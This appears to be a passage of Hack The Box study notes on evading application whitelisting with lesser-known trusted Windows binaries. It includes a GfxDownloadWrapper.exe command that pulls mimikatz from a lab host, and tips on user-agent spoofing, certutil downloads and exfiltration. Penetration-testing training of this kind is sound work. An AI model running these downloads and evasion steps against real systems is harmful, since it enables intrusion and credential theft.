When PowerShell and Netcat are blocked by application whitelisting, use less known LOLBins that are trusted by the environment.

### Example - Intel Graphics Driver (`GfxDownloadWrapper.exe`)

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

This binary has legitimate download functionality built in - it's trusted, whitelisted, and generates no alerts.

> Always check LOLBAS for Windows and GTFOBins for Linux to find binaries available in the specific environment you're targeting.

## Key Concepts to Internalize


| Concept                                  | Why It Matters                                                                 |
| ---------------------------------------- | ------------------------------------------------------------------------------ |
| **User agent spoofing**                  | Bypasses user agent blacklists — traffic looks like normal browser activity    |
| **Match the environment**                | Use Chrome UA if Chrome is the standard browser — blends into baseline traffic |
| **Obscure LOLBins beat whitelisting**    | Common LOLBins may be blacklisted; lesser-known trusted binaries often aren't  |
| **GTFOBins covers ~40 binaries**         | Always worth checking — there's almost always a native binary that fits        |
| **No single technique works everywhere** | Master multiple methods and adapt to what the environment allows               |

## Closing Thoughts
The module recommends building muscle memory by applying these techniques across all HTB labs:

- Got a web shell? → Use certutil to download tools
- Need to exfiltrate? → Use impacket-smbserver or Python uploadserver
- Blocked by AV/whitelisting? → Find a LOLBin or GTFOBin that fits the environment
- Always try at least one new LOLBin/GTFOBin per engagement
